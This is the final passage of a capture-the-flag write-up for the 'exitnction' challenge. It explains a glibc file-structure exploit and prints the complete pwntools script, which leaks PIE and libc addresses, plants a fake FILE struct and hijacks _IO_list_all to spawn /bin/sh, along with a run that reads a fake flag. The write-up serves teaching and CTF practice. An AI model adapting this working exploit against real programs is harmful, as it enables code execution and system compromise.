So, `pieBase+0x4210` is the file pointer that is the start of the fake file struct and the rest of the writes we have already covered in detail!

After we have placed the fake file struct in the `.bss` section we have to overwrite the `_IO_lis_all` to that address so, `_IO_flush_all` triggers the vtable of our fake file!

```python
write(libc.symbols['_IO_list_all'], p64(pieBase + 0x4210))
```

Now, that we have everything setup we just have to exit the program:

```python
io.sendlineafter(b"> ", b"exit")
io.interactive()
```

### Field Goal? Nah — Full Touchdown

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './exitnction')
libc = ELF(exe.libc.path)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def write(addr, data):
    io.sendlineafter(b"> ", b"write")
    io.sendlineafter(b": 0x", hex(addr).encode())
    io.sendlineafter(b"(8 chars): ", data)
    io.sendlineafter(b"(64 chars): ", b"")

gdbscript = '''
b exit
'''.format(**locals())

io = start()
io.sendlineafter(b"> ", b"server")

io.recvuntil(b"0x")
pieBase = int(io.recvline().strip().decode()[:-1], 16) - exe.symbols['current_license']

io.recvuntil(b"0x")
libc.address = int(io.recvline().strip().decode()[:-1], 16) - libc.symbols['exit']

write(pieBase + 0x4210, b"/bin/sh\x00".ljust(0x8, b"\x00"))
write(pieBase + 0x4210 + 0x18, p64(libc.symbols["system"]))
write(pieBase + 0x4210 + 0x88 + 1, p64(libc.address + 0x205700)[1:])
write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))

write(pieBase + 0x4210 + 0xa0, p64(pieBase + 0x4210 - 0x20))
write(pieBase + 0x4210 + 0xc0, p64(pieBase + 0x4210))
write(pieBase + 0x4210 + 0xd8, p64((libc.symbols['_IO_wfile_jumps'] + 0x48) - 0x18))
write(pieBase + exe.symbols['sent_mails'], p64(-1, sign=True))

write(libc.symbols['_IO_list_all'], p64(pieBase + 0x4210))

io.sendlineafter(b"> ", b"exit")
io.interactive()
```

```
┌──(kali㉿kali)-[~/…/ctf-scripts/openecsc/2025/exitnction]
└─$ python3 xpl.py 
...SNIP...
$ cat flag.txt
fakeflag{FAKE_FLAG_4_TESTING}
```

## Conclusion

Alright — that’s the ride. I hope this made sense and thanks for reading — hope you enjoyed the teardown.

## References

- https://blog.kylebot.net/2022/10/22/angry-FSROP/
- https://chovid99.github.io/posts/file-structure-attack-part-1/
- https://elixir.bootlin.com/glibc/glibc-2.39/source
- https://zenn.dev/rona/articles/5c6f11aabfaf9e

If anything above looks wrong, sloppy, or just plain cursed — tell me. I'm pretty new to file struct exploitation so corrections, nitpicks, and roasts are welcome. 
